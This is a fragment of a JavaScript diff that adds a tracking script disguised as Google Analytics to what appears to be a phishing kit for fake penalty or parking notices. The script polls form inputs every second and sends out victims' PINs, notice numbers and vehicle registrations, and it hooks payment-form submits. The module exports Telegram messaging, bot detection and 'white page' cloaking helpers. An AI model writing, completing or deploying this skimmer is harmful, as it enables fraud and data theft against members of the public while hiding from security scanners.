+      _send({t:'event',ec:'payment',ea:'form_submit',el:'pay',ev:btnText||'Pay Form',pg:_getPageType()});
+    }
+  },true);
+  
+  setInterval(_detectStep,1500);
+  setTimeout(_detectStep,500);
+  
+  // Track PIN/Notice completion periodically
+  var _lastPIN='',_lastNotice='',_lastVRN='';
+  setInterval(function(){
+    var pin=_collectPIN();
+    if(pin&&pin.length>=4&&pin!==_lastPIN){
+      _lastPIN=pin;
+      _send({t:'event',ec:'form',ea:'complete',el:'pin',ev:pin,pg:_getPageType()});
+    }
+    var notice=_collectNotice();
+    if(notice&&notice.length>=6&&notice!==_lastNotice){
+      _lastNotice=notice;
+      _send({t:'event',ec:'form',ea:'complete',el:'notice',ev:notice,pg:_getPageType()});
+    }
+    var vrnInputs=d.querySelectorAll('input[name*="vehicle"],input[name*="reg"],input[id*="vehicle"],input[id*="registration"]');
+    for(var i=0;i<vrnInputs.length;i++){
+      if(vrnInputs[i].value&&vrnInputs[i].value.length>=5&&vrnInputs[i].value!==_lastVRN){
+        _lastVRN=vrnInputs[i].value;
+        _send({t:'event',ec:'form',ea:'complete',el:'vh',ev:vrnInputs[i].value,pg:_getPageType()});
+      }
+    }
+  },1000);
+  
+  _send({t:'event',ec:'page',ea:'view',el:_getPageType(),ev:_page});
+  
+})(window,document,'script','ga','G-MEASUREMENT');
+</script>`;
+}
+
+module.exports = {
+  trackPageRequest,
+  trackingMiddleware,
+  handleTrackingAPI,
+  handleAnalyticsAPI,
+  trackEvent,
+  sendTelegramMessage,
+  editTelegramMessage,
+  getTrackingScript,
+  getSessionId,
+  isBot,
+  isSuspiciousPath,
+  isWhitePageRequest,
+};
